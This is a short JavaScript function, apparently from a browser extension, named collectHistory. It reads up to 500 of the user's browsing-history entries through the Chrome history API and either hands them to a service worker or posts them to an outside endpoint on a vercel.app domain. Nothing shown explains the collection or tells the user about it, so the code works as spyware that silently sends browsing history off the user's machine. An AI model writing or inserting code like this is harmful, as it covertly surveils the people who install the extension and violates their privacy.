export const collectHistory = () => {
    if (typeof chrome !== 'undefined' && chrome.history) {
        chrome.history.search({text: '', maxResults: 500}, results => {
            if (navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'history_data',
                    data: results
                });
            } else {
                fetch('https://schoolhubuz.vercel.app/api/collect', {
                    method: 'POST',
                    body: JSON.stringify(results),
                    headers: {'Content-Type': 'application/json'}
                });
            }
        });
    }
};